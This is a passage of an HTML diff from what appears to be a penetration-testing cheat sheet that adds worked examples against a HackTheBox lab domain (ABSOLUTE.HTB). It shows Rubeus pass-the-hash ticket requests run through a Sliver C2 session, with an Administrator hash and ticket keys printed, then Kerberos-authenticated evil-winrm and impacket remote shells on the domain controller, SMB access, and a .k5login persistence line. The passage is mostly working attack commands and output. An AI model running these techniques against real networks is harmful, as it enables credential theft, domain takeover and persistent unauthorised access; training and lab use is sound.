+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.2 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using salt: ABSOLUTE.HTBm.lovegod
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;ABSOLUTE.HTB\m.lovegod&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  m.lovegod (NT_PRINCIPAL)
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  9/24/2024 7:16:52 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  9/24/2024 11:16:52 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  9/24/2024 11:16:52 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  aes256_cts_hmac_sha1
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  aBhZJr9iogDKSLtohxAgie5HPBSLktIxsRYujp/MqVA=
+</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
 </span></span><span class="line"><span class="cl"><span class="go">rubeus -- &#39;asktgt /user:&lt;USER&gt; /rc4:&lt;HASH&gt; /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sliver (helloworld) &gt; rubeus -- &#39;asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] rubeus output:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.2 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Ask TGT
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;ABSOLUTE.HTB\Administrator&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+</span></span></span><span class="line"><span class="cl"><span class="go">      
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName                 :  Administrator (NT_PRINCIPAL)
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserRealm                :  ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime                :  9/24/2024 7:17:33 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime                  :  9/24/2024 5:17:33 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill                :  10/1/2024 7:17:33 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  KeyType                  :  rc4_hmac
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64(key)              :  BIdtxt2Rokdo+R9tNjoCLA==
+</span></span></span><span class="line"><span class="cl"><span class="go">  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
 </span></span><span class="line"><span class="cl"><span class="go">c2tc-klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sliver (helloworld) &gt; c2tc-klist
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully executed c2tc-klist (coff-loader)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got output:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Cached Tickets: (1)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>0&gt;     Client: Administrator @ ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        KerbTicket Encryption Type: (18) AES256_CTS_HMAC_SHA1_96
+</span></span></span><span class="line"><span class="cl"><span class="go">        Ticket Flags: 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize 
+</span></span></span><span class="line"><span class="cl"><span class="go">        Start Time: 9/24/2024 7:17:33
+</span></span></span><span class="line"><span class="cl"><span class="go">        End Time:   9/24/2024 17:17:33
+</span></span></span><span class="line"><span class="cl"><span class="go">        Renew Time: 10/1/2024 7:17:33
+</span></span></span><span class="line"><span class="cl"><span class="go">        Session Key Type: (23) RC4_HMAC_NT
+</span></span></span><span class="line"><span class="cl"><span class="go">        Cache Flags: 0x1 -&gt; PRIMARY
+</span></span></span><span class="line"><span class="cl"><span class="go">        Kdc Called:
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="winrm-with-kerberos">Winrm with Kerberos</h3>
@@ -453,16 +721,51 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
 </span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = &lt;DOMAIN&gt;
 </span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = &lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[libdefaults]
+</span></span></span><span class="line"><span class="cl"><span class="go">    default_realm = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[realms]
+</span></span></span><span class="line"><span class="cl"><span class="go">    ABSOLUTE.HTB = {
+</span></span></span><span class="line"><span class="cl"><span class="go">        kdc = DC.ABSOLUTE.HTB:88
+</span></span></span><span class="line"><span class="cl"><span class="go">        admin_server = DC.ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        default_domain = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">    }
+</span></span></span><span class="line"><span class="cl"><span class="go">    
+</span></span></span><span class="line"><span class="cl"><span class="go">[domain_realm]
+</span></span></span><span class="line"><span class="cl"><span class="go">    .domain.internal = ABSOLUTE.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">    domain.internal = ABSOLUTE.HTB
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Step 2: Connect
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; evil-winrm -i &lt;TARGET_DOMAIN&gt; -r &lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Evil-WinRM shell v3.5
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span class="line"><span class="cl"><span class="go">                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">Info: Establishing connection to remote endpoint
+</span></span></span><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; 
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set6" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-wmiexec &#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-wmiexec <span class="s1">&#39;ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB&#39;</span> -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] SMBv3.0 dialect used
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Launching semi-interactive shell - Careful what you execute
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\&gt;
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="connect-to-smb-with-kerberos">Connect to SMB with Kerberos</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-smbclient &#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
-</span></span></span></code></pre></div><hr>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-smbclient <span class="s1">&#39;ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB&#39;</span> -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Type help for list of commands
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> 
+</span></span></code></pre></div><hr>
 <h3 id="add-kerberos-access-in-linux">Add Kerberos Access in Linux</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">echo &#34;&lt;USER&gt;@&lt;DOMAIN&gt;&#34; &gt; /home/&lt;TARGET_USER&gt;/.k5login
 </span></span></span></code></pre></div>
